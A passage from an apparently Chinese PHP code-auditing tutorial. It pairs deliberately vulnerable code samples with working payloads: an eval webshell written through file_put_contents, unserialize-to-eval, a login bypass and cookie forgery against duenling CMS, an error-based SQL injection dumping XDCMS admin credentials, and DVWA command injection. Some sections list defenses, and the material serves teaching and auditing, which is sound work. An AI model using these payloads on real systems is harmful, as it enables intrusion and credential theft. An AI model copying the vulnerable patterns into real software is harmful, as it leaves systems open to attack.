class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h2><ul>
<li><p>开启gpc  —— PHP解析器就会自动为post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符（认为是php的字符）引起的污染</p>
</li>
<li><p>mysql_real_escape_string (已被弃用，<a href="https://www.runoob.com/php/php-pdo.html" target="_blank" rel="noopener">使用PDO拓展</a>)</p>
</li>
<li><p>addslashes  —— 在每个双引号（”）前添加反斜杠</p>
</li>
<li><p>关键字过滤</p>
</li>
</ul>
<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。</p>
<h2 id="可以做什么"><a href="#可以做什么" class="headerlink" title="可以做什么"></a>可以做什么</h2><p>你这可以这么理解CSRF攻击：<strong>攻击者盗用了你的身份，以你的名义发送恶意请求</strong>。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。</p>
<h2 id="现状"><a href="#现状" class="headerlink" title="现状"></a>现状</h2><p>CSRF这种攻击方式在2000年已经被国外的安全人员提出，但在国内，直到06年才开始被关注，08年，国内外的多个大型社区和交互网站分别爆出CSRF漏洞，如：NYTimes.com（纽约时报）、Metafilter（一个大型的BLOG网站），YouTube和百度HI……而现在，互联网上的许多站点仍对此毫无防备，以至于<strong>安全业界称CSRF为“沉睡的巨人”</strong>。</p>
<h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p>敏感表单是否使用token 验证<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mysql_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">''</span>);</span><br><span class="line">mysql_select_db(<span class="string">'test'</span>);</span><br><span class="line">mysql_query(<span class="string">"set names gbk"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'sub'</span>]))&#123;</span><br><span class="line">    $name=$_POST[<span class="string">'name'</span>];</span><br><span class="line">    $pass=$_POST[<span class="string">'pass'</span>];</span><br><span class="line">    $sql=<span class="string">"INSERT INTO `admin`(`id` ,`name` ,`pass`)VALUES (NULL , '$name', '$pass');"</span>;</span><br><span class="line">    <span class="keyword">if</span>($row=mysql_query($sql))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"ok"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"no"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $sql=<span class="string">"select * from admin"</span>;</span><br><span class="line">    <span class="keyword">if</span>($row=mysql_query($sql))&#123;</span><br><span class="line">        <span class="keyword">while</span>($rows=mysql_fetch_array($row))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"name:&#123;$rows[name]&#125;--pass:&#123;$rows[pass]&#125;&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">    name:&lt;input type=<span class="string">'text'</span> name=<span class="string">"name"</span>&gt;&lt;br&gt;</span><br><span class="line">    pass:&lt;input type=<span class="string">"password"</span> name=<span class="string">"pass"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"ok"</span> name=<span class="string">"sub"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h2><ol>
<li><p>验证 HTTP Referer 字段</p>
</li>
<li><p>在请求地址中添加 token 并验证</p>
</li>
<li><p>在 HTTP 头中自定义属性并验证</p>
</li>
</ol>
<h1 id="动态函数执行与匿名函数执行"><a href="#动态函数执行与匿名函数执行" class="headerlink" title="动态函数执行与匿名函数执行"></a>动态函数执行与匿名函数执行</h1><h2 id="动态函数执行"><a href="#动态函数执行" class="headerlink" title="动态函数执行"></a>动态函数执行</h2><p>函数与函数之间的调用，可能会造成的漏洞<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"a"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"b"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">c</span><span class="params">($c)</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"c"</span>;</span><br><span class="line">$c();</span><br><span class="line">&#125;</span><br><span class="line">c($_GET[<span class="string">'c'</span>]);</span><br></pre></td></tr></table></figure><br>payload:<code>?c=a</code></p>
<p>输出:<code>ca</code></p>
<p>也可以传phpinfo</p>
<p>payload:<code>?c=phpinfo</code></p>
<h2 id="匿名函数执行"><a href="#匿名函数执行" class="headerlink" title="匿名函数执行"></a>匿名函数执行</h2><p>匿名函数（Anonymous functions），也叫闭包函数（closures），允许 临时创建一个没有指定名称的函数。最经常用作回调函数（callback）参数的值。</p>
<p><code>create_function</code> 创建匿名函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">$lambda=create_function(<span class="string">'$a,$b'</span>,<span class="string">'return (strlen($a)-strlen($b)+'</span>.<span class="string">"strlen($c));"</span>);</span><br><span class="line"><span class="comment">//var_dump($lambda);</span></span><br><span class="line">$array=<span class="keyword">array</span>(<span class="string">'reall long string here,boy'</span>,<span class="string">'this'</span>,<span class="string">'midding length'</span>,<span class="string">'larget'</span>);</span><br><span class="line">usort($array,$lambda);</span><br><span class="line">print_r($array);</span><br></pre></td></tr></table></figure>
<p>payload:<code>?c=1));}phpinfo();//</code></p>
<h1 id="unserialize反序列化"><a href="#unserialize反序列化" class="headerlink" title="unserialize反序列化"></a>unserialize反序列化</h1><ol>
<li><p>unserialize函数的参数可控</p>
</li>
<li><p>脚本中存在一个构造函数、析构函数、__wakeup()函数中 有类</p>
</li>
<li><p>对象中的成员变量的值</p>
</li>
</ol>
<p><strong>反序列化的变量会覆盖类中变量的值</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test=<span class="string">"moonsec"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[<span class="string">'code'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* class demo&#123;</span></span><br><span class="line"><span class="comment">   var $test="phpinfo();";</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">$class = new demo();</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">print_r(serialize($class ));</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload:<code>?code=O:4:&quot;demo&quot;:1:{s:4:&quot;test&quot;;s:10:&quot;phpinfo();&quot;;}</code></p>
<p>反序列化漏洞需要配合其他漏洞使用</p>
<h1 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h1><p>变量覆盖漏洞产生的原因有两种：</p>
<p>第一种 是<code>register_globals</code>为on的情况，PHP4默认开启，PHP5以后默认关闭。 PHP5.6以上只能通过$_GET</p>
<p>第二种 是<strong>人为注册成为全局变量</strong></p>
<p><strong>全局变量的取值与赋值</strong><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//全局变量的取值与赋值</span></span><br><span class="line"><span class="keyword">echo</span> $a=<span class="string">'a'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $GLOBALS[<span class="string">'a'</span>]=<span class="string">"b"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure></p>
<p><strong>当<code>register_globals</code>关闭时</strong><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>) <span class="keyword">as</span> $requset)&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($$requset <span class="keyword">as</span> $_k =&gt;$_v)&#123;</span><br><span class="line">        print_r($$_k=$_v);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>payload:<code>?moon=1</code></p>
<h1 id="文件管理漏洞"><a href="#文件管理漏洞" class="headerlink" title="文件管理漏洞"></a>文件管理漏洞</h1><p>PHP 的用于文件管理的函数，如果输入变量可由用户提交，程序中也没有做数据验证，可<br>能成为高危漏洞</p>
<p>常见函数<br><code>copy、rmdir、unlink、delete、fwrite、
chmod、 fgetc、 fgetcsv、 fgets、 fgetss、 file、 file_get_contents 、 fread、 readfile、 ftruncate、
file_put_contents、fputcsv、fputs、fopen</code></p>
<p><strong>增加 删除 编写 修改</strong></p>
<p>以常见的<code>unlink</code>为例子<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">	unlink($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>payload:<code>?file=./demo.php</code></p>
<p>这样这个demo.php就被删除了</p>
<p>以<code>file_get_contents</code>为例<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">echo</span> file_get_contents( $file);</span><br></pre></td></tr></table></figure><br>payload:<code>?file=./1.txt</code></p>
<p>可以读取php源文件等</p>
<p>以<code>readfile</code>为例<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line"> <span class="keyword">echo</span> readfile($file);</span><br></pre></td></tr></table></figure><br>也可以读php源代码，并且输出长度</p>
<p>以<code>file_put_contents</code>为例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">$txt=$_GET[<span class="string">'txt'</span>];</span><br><span class="line"> file_put_contents($file,$txt);</span><br></pre></td></tr></table></figure>
<p>payload:<code>?file=./demo.php&amp;txt=&lt;?php eval($_POST[CMD]);?&gt;</code></p>
<p>就可以将一句话写入文件</p>
<p>以<code>copy</code>为例<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">$txt=$_GET[<span class="string">'txt'</span>];</span><br><span class="line">copy($file,$txt);</span><br></pre></td></tr></table></figure><br>payload:<code>?file=./demo.php&amp;txt=demo2.php</code></p>
<p>这样就copy了一个demo2.php</p>
<p>以<code>fwrite</code>和<code>fopen</code>为例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">fwrite(fopen($file,<span class="string">"a+"</span>),<span class="string">"&lt;?php phpinfo();?&gt;"</span>);</span><br></pre></td></tr></table></figure>
<p>payload:<code>?file=./demo3.php</code></p>
<p>这样就新建了一个demo3.php 并且写入</p>
<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>审计函数：<code>move_uploaded_file</code></p>
<p>超全局变量<code>$_FILES</code><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">print_r($_FILES);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form method=<span class="string">"post"</span> name=<span class="string">"upform"</span> action=<span class="string">""</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"uploadfile"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"upload"</span> name=<span class="string">"upload"</span>&gt;&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><br>tmp是临时上传的路径名</p>
<ol>
<li>后缀名是图片格式</li>
<li>前缀名不能是外部提交的</li>
<li>上传的目录不可以是获取外部提交的路径<br><code>1.asp;/1213.asp.jpg</code></li>
</ol>
<h2 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h2><ol>
<li>使用白名单方式检测文件后缀</li>
<li>上传之后按时间能算法生成文件名称</li>
<li>上传目录脚本文件不可执行</li>
<li>注意%00 截</li>
<li>Content-Type  验证</li>
</ol>
<h1 id="CMS后台登录绕过漏洞"><a href="#CMS后台登录绕过漏洞" class="headerlink" title="CMS后台登录绕过漏洞"></a>CMS后台登录绕过漏洞</h1><p>这里用duenling_v1.0来学习</p>
<p>安装成功后登录一下，没有问题之后就可以学习了</p>
<p>存在漏洞<br>admin/login.php<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'../config.php'</span>;</span><br><span class="line">$adminname = $_POST[<span class="string">'adminname'</span>];</span><br><span class="line">$adminpass = $_POST[<span class="string">'adminpass'</span>];</span><br><span class="line">$adminpass .= <span class="string">"Axphp.com"</span>;</span><br><span class="line">$adminpass = md5($adminpass);</span><br><span class="line"><span class="keyword">echo</span> $adminsql = <span class="string">"select * from axphp_admin where adminname='$adminname' and adminpass='$adminpass'"</span>;</span><br><span class="line">$adminery = mysql_query($adminsql, $config);</span><br><span class="line">$adminnum = mysql_num_rows($adminery);</span><br><span class="line"><span class="keyword">if</span> ($adminnum == <span class="string">"1"</span>) &#123;</span><br><span class="line">setcookie(<span class="string">"admin"</span>, <span class="string">"Y"</span>, time() + <span class="number">3600</span>, <span class="string">'/'</span>);</span><br><span class="line">setcookie(<span class="string">"admin_name"</span>, $adminname, time() + <span class="number">3600</span>, <span class="string">'/'</span>);</span><br><span class="line">header(<span class="string">"location:axadmin.php"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">header(<span class="string">"location:axphp.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>漏洞语句：<br><code>$adminsql = &quot;select * from axphp_admin where adminname=&#39;$adminname&#39; and adminpass=&#39;$adminpass&#39;&quot;;</code></p>
<p>可以看到这个地方<code>$adminname</code>为可控变量，且前后有单引号，虽然他登录页做了前端的js过滤了一些特殊字符，但是后台没有做任何过滤和检测，密码也没有做任何验证，所以可以直接绕过登录</p>
<p>payload:<code>admin&#39;#</code>密码随意</p>
<p>接下来看admin_pass.php<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'check.php'</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">'../template/axadmin/head.php'</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">'../template/axadmin/banner.php'</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">'../template/axadmin/admin_pass.php'</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">'../template/axadmin/bottom.php'</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>发现与admin相关的操作都要通过check.php，所以接着看check.php<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">isset</span>($_COOKIE[<span class="string">'admin'</span>])?$check=$_COOKIE[<span class="string">'admin'</span>]:$check=<span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">isset</span>($_COOKIE[<span class="string">'admin_name'</span>])?$admin_user=$_COOKIE[<span class="string">'admin_name'</span>]:$user=<span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>($check==<span class="keyword">null</span>)&#123;header(<span class="string">"Location:../index.php"</span>);<span class="keyword">exit</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>它这个就是对全局变量Cookie做了一个判断，如果为Null，就跳转到index首页进行一个普通用户的登录</p>
<p>但是他没有做任何操作，我们可以通过伪造cookie来完成</p>
<p>访问<code>admin/admin_pass.php</code>抓包</p>
<p>payload：<code>cookie:admin=51nd0re1</code></p>
<p>通过伪造cookie直接登录后台</p>
<h1 id="漏洞挖掘思路"><a href="#漏洞挖掘思路" class="headerlink" title="漏洞挖掘思路"></a>漏洞挖掘思路</h1><p><strong>程序的两大根本：变量和函数</strong></p>
<p><strong>漏洞形成的条件：</strong></p>
<ol>
<li>可以控制的变量（一切输入都是有害的）</li>
<li>变量到达有利用价值的函数（危险函数）</li>
</ol>
<p><strong>漏洞造成的效果：</strong></p>
<ul>
<li>漏洞的利用效果取决于最终函数的功能</li>
<li>变量进入什么样的函数就导致什么样的效果</li>
</ul>
<p><strong>危险函数：</strong><br>什么样的函数就会导致什么样的漏洞</p>
<ul>
<li>文件包含：包含漏洞</li>
<li>代码执行：执行任意代码漏洞</li>
<li>命令执行：执行任意命令漏洞</li>
<li>文件系统操作：文件（目录）读写删等漏洞</li>
<li>数据库操作：SQL注入漏洞</li>
<li>数据显示：xss等客服端漏洞</li>
</ul>
<p><strong>代码审计的本质：</strong><br>找漏洞==找对应变量与函数</p>
<p><strong>变量跟踪的过程:</strong><br>通过变量找函数【正向跟踪】</p>
<p>通过函数找变量【逆向跟踪】</p>
<h1 id="实战XDCMS"><a href="#实战XDCMS" class="headerlink" title="实战XDCMS"></a>实战XDCMS</h1><ul>
<li>XDcms_v 2.0.8</li>
<li>PHP 5.6</li>
<li>mysql 8.0.23</li>
</ul>
<p>先访问进行安装，安装完成之后就可以登录网站后台了后台默认账号密码都是<code>xdcms</code></p>
<p>先看源码在system/function的global.inc.php</p>
<p>看到接受参数，这些是可控的<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$m=safe_replace(safe_html(<span class="keyword">isset</span>($_GET[<span class="string">"m"</span>]))) ? safe_replace(safe_html($_GET[<span class="string">"m"</span>])) : <span class="string">"content"</span>;</span><br><span class="line">$c=safe_replace(safe_html(<span class="keyword">isset</span>($_GET[<span class="string">"c"</span>]))) ? safe_replace(safe_html($_GET[<span class="string">"c"</span>])) : <span class="string">"index"</span>;</span><br><span class="line">$f=safe_replace(safe_html(<span class="keyword">isset</span>($_GET[<span class="string">"f"</span>]))) ? safe_replace(safe_html($_GET[<span class="string">"f"</span>])) : <span class="string">"init"</span>;</span><br></pre></td></tr></table></figure></p>
<p>然后搜一下安全过滤函数<code>safe_html</code>和<code>safe_replace</code><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//安全过滤函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_html</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($str))&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">	<span class="keyword">if</span> (preg_match(<span class="string">'/\b select\b |\b insert\b | \b update\b | \b and\b | \b in\b | \b on\b | \b left\b |\b joins\b | \b delete\b |\%|\=|\/\*|\*| \b union\b |\.\.\/|\.\/| \b from\b | \b where\b | \b group\b | \binto\b |\bload_file\b</span></span><br><span class="line"><span class="string">	|\boutfile\b/i'</span>,$str))&#123;showmsg(C(<span class="string">'error'</span>),<span class="string">'-1'</span>);&#125;</span><br><span class="line">	<span class="keyword">return</span> htmlspecialchars($str, ENT_COMPAT ,<span class="string">'GB2312'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//安全过滤函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_replace</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">	$string = str_replace(<span class="string">'%20'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'%27'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'%2527'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'*'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot;'</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">"'"</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'"'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">';'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'&lt;'</span>,<span class="string">'&amp;lt;'</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">"&#123;"</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'&#125;'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'\\'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	<span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们接着看，发现接收参数的时候只对GET进行了过滤，所以POST或cookie就可能存在注入</p>
<p>所以搜一下<code>$_POST</code>并且是位于前端的，发现在modules/member/index.php发现没有被过滤可以利用的点<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register_save</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$username=safe_html($_POST[<span class="string">'username'</span>]);</span><br><span class="line">		$password=$_POST[<span class="string">'password'</span>];</span><br><span class="line">		$password2=$_POST[<span class="string">'password2'</span>];</span><br><span class="line">		$fields=$_POST[<span class="string">'fields'</span>];</span><br><span class="line">....</span><br></pre></td></tr></table></figure></p>
<p>在会员注册的地方找到利用点，我们先随便注册一个会员，抓包<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;4454564&amp;password&#x3D;4454564&amp;password2&#x3D;4454564&amp;fields%5Btruename%5D&#x3D;4454564&amp;fields%5Bemail%5D&#x3D;4454564&amp;submit&#x3D;+%D7%A2+%B2%E1+</span><br></pre></td></tr></table></figure></p>
<p>并且接着看源码，发现sql语句<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> c_member <span class="keyword">set</span> <span class="string">`truename`</span>=<span class="string">'lxhacker'</span>,<span class="string">`email`</span>=<span class="string">'123456'</span> <span class="keyword">where</span> userid=<span class="number">3</span></span><br></pre></td></tr></table></figure></p>
<p>对抓包的内容进行添加单引号等修改，发现了报错，追踪一下query这个function<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//执行查询</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">query</span><span class="params">($sql)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!$res=@mysql_query($sql,<span class="keyword">$this</span>-&gt;ConnStr))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'操作数据库失败'</span>.mysql_error().<span class="string">"&lt;br&gt;sql:&#123;$sql&#125;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这就可以利用一个报错注入<br><strong>EXP</strong><br><code>456&#39; where userid=8 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,username,0x3a,password,0x3a,encrypt,0x27,0x7e) from c_admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#</code></p>
<h1 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h1><p>暴力破解不做解释了</p>
<h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><p>先看源码<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">'ip'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>可以看到没有做任何的过滤处理，可以直接执行，下面都以<code>whoami</code>为例<br>Low级别真的太多了，就举个常用例子吧<br>payload<code>127.0.0.1 &amp;&amp; whoami</code></p>
<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">'ip'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    $substitutions = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'&amp;&amp;'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">';'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到用了正则过滤了<code>&amp;&amp;</code>和<code>;</code> 黑名单过滤不全，可以用<code>||</code>,<code>|</code>,<code>|</code>,<code>&amp;</code>，这里要说明，在PHP里<code>&amp;&amp;</code>是前面不执行后面就不执行，有截断性，而<code>&amp;</code>是不管前面的命令是否值执行，后面的都执行</p>
<p>payload:<code>127.0.0.1 &amp; whoami</code></p>
